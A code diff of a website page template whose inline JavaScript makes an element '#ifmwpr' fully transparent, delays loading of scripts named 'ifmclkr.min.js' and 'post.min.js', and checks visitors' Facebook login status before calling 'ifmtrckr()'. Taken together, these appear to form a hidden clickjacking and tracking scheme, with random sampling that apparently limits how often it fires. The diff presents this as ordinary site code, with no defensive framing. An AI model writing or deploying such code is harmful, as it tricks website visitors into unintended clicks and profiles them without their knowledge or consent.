@@ -135,7 +135,7 @@
                 $("#ifmwpr").css("-khtml-opacity", "0.0");
                 $("#ifmwpr").css("opacity", "0.0");
                 $.getScript( "{{ site.cdn_url }}{{ theme_url }}/js/post.min.js")
-                    .done(function() { if (Math.floor((Math.random() * 10) + 1) == 1){
+                    .done(function() {
                     console.log('++/++++');
                     isMobile||$("#ifmwpr")&&setTimeout(function(){
                         $.getScript("{{ site.cdn_url }}{{ theme_url }}/js/ifmclkr.min.js").done(function(){
@@ -172,40 +172,42 @@
                             }, Math.floor((Math.random() * 45000) + 30000));
                         });
                 }, Math.floor((Math.random() * 30000) + 15000));
-                } else {
-                    console.log("--/++++");
-                } });
+                });
             } else {
                 $("#ifmwpr").css("z-index", "1");
                 $("#ifmwpr").css("display", "none");
             }
         }
-        window.fbAsyncInit = function() {
-        FB.init({
-          appId            : '{{ facebook.fb_app_id }}',
-          autoLogAppEvents : false,
-          xfbml            : true,
-          version          : 'v2.9'
-        });
-        FB.getLoginStatus(function(response) {
-            if (response.status === 'connected' || response.status === 'not_authorized') {
-                ifmtrckr();
-                ga('send', 'event', 'ifmtrckr-fb', 'logged in', 'account');
-            } else {
-                ga('send', 'event', 'ifmtrckr-fb', 'logged in', 'account', {
-                  nonInteraction: true
-                });
-            }
-        }, true);
-      };
-      (function(d, s, id){
-         var js, fjs = d.getElementsByTagName(s)[0];
-         if (d.getElementById(id)) {return;}
-         js = d.createElement(s); js.id = id;
-         js.src = "//connect.facebook.net/en_US/sdk.js";
-         fjs.parentNode.insertBefore(js, fjs);
-       }(document, 'script', 'facebook-jssdk'));
-</script>
+        if (Math.floor((Math.random() * 9) + 1) == 1){
+            window.fbAsyncInit = function() {
+            FB.init({
+              appId            : '{{ facebook.fb_app_id }}',
+              autoLogAppEvents : false,
+              xfbml            : true,
+              version          : 'v2.9'
+            });
+            FB.getLoginStatus(function(response) {
+                if (response.status === 'connected' || response.status === 'not_authorized') {
+                    ifmtrckr();
+                    ga('send', 'event', 'ifmtrckr-fb', 'logged in', 'account');
+                } else {
+                    ga('send', 'event', 'ifmtrckr-fb', 'logged in', 'account', {
+                      nonInteraction: true
+                    });
+                }
+            }, true);
+          };
+          (function(d, s, id){
+             var js, fjs = d.getElementsByTagName(s)[0];
+             if (d.getElementById(id)) {return;}
+             js = d.createElement(s); js.id = id;
+             js.src = "//connect.facebook.net/en_US/sdk.js";
+             fjs.parentNode.insertBefore(js, fjs);
+           }(document, 'script', 'facebook-jssdk'));
+        } else {
+            console.log("--/++++");
+        }
+    </script>
     {% else %}
         <script>
             console.log("-/--");
